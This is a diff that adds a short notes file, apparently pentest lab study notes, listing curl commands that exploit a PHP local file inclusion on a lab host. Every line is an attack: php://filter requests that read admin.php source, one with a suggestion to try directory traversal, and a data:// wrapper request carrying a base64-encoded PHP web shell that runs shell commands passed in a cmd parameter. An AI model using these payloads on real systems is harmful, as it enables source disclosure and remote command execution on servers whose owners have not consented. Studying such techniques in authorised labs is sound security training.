@@ -1,0 +1,5 @@
+EXAMPLE USAGE. == curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+
+BASE64 ENCODING == curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=<ADMIN.PHP or TRY directory traversal to a different file.>
+
+Try using the data wrapper to execute cmds. == curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls" Make sure you also use base64 for the intended cmd.
